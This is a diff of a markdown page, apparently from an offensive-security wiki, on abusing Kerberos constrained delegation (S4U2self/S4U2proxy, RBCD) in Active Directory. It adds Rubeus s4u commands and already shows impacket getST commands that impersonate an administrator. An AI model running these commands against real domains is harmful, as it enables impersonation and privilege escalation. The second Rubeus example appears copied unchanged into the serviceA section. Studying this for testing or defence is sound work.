@@ -35,20 +35,24 @@ getST -spn "cifs/target" -impersonate "administrator" "domain/service:password"
 ```
 
 {% hint style="warning" %}
-When attempting to exploit that technique, if the following error triggers, it means that either
-
-* the account was sensitive for delegation, or a member of the "Protected Users" group.
-* or the constrained delegations are configured [without protocol transition](constrained.md#without-protocol-transition)
-
 ```
 [-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
 [-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable
 ```
+
+When attempting to exploit that technique, if the error above triggers, it means that either
+
+* the account was sensitive for delegation, or a member of the "Protected Users" group.
+* or the constrained delegations are configured [without protocol transition](constrained.md#without-protocol-transition)
 {% endhint %}
 {% endtab %}
 
 {% tab title="Windows" %}
-//TODO rubeus
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose, to conduct a full S4U2 attack (S4U2self + S4U2proxy).
+
+```powershell
+.\Rubeus.exe s4u /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
+```
 {% endtab %}
 {% endtabs %}
 
@@ -71,6 +75,8 @@ While the "ticket capture" way would theoretically work, the RBCD approach is pr
 
 The service account (called **serviceA**) configured for KCD needs to be configured for RBCD (Resource-Based Constrained Delegations). The service's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute needs to be appended with an account controlled by the attacker. This second account (called **serviceB**) needs to have at least one SPN.
 
+#### 1. Full S4U2 (self + proxy)
+
 The attacker can then proceed to a full S4U2 attack (S4U2self + S4U2proxy, a standard [RBCD attack](rbcd.md) or [KCD with protocol transition](constrained.md#with-protocol-transition)) to obtain a forwardable ST from a user to one of **serviceA**'s SPNs, using **serviceB**'s credentials.
 
 {% tabs %}
@@ -83,9 +89,15 @@ getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:passwor
 {% endtab %}
 
 {% tab title="Windows" %}
-//TODO rubeus
+From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose, to conduct a full S4U2 attack (S4U2self + S4U2proxy).
+
+```powershell
+.\Rubeus.exe s4u /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
+```
 {% endtab %}
 {% endtabs %}
+
+#### 2. Additional S4U2proxy
 
 Once the ticket is obtained, it can be used in a S4U2proxy request, made by **serviceA**, on behalf of the impersonated user, to obtain access to one of the services **serviceA** can delegate to.
 
@@ -99,7 +111,7 @@ getST -spn "cifs/target" -impersonate "administrator" -additional-ticket "admini
 {% endtab %}
 
 {% tab title="Windows" %}
-
+//TODO Rubeus
 {% endtab %}
 {% endtabs %}
 
